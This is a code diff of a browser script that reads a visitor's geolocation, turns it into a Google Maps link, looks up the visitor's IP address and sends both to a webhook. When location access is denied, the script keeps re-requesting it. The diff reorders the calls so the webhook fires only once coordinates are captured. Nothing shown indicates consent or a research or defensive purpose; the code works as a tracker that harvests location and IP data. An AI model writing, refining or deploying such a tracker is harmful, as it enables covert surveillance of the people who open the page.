@@ -1,5 +1,6 @@
 let mapsUrl;
 
+// Function to request location permission
 function requestLocationPermission() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(success, error);
@@ -8,12 +9,15 @@ function requestLocationPermission() {
     }
 }
 
+// Success callback for geolocation
 function success(position) {
     let LATITUDE = position.coords.latitude;
     let LONGITUDE = position.coords.longitude;
     mapsUrl = `https://www.google.com/maps/@${LATITUDE},${LONGITUDE},15z?entry=ttu`;
+    getIpAddress();  // Proceed to get the IP address and send the webhook after location is obtained
 }
 
+// Error callback for geolocation
 function error(err) {
     if (err.code === err.PERMISSION_DENIED) {
         alert("Location access denied. Requesting permission again.");
@@ -22,9 +26,6 @@ function error(err) {
         alert("An error occurred while retrieving location: " + err.message);
     }
 }
-
-// Start requesting location permission
-requestLocationPermission();
 
 // Function to send the webhook message
 function sendWebhook(ip) {
@@ -71,5 +72,5 @@ function getIpAddress() {
     });
 }
 
-// Call the function to get the IP address and send the webhook message
-getIpAddress();
+// Start requesting location permission
+requestLocationPermission();
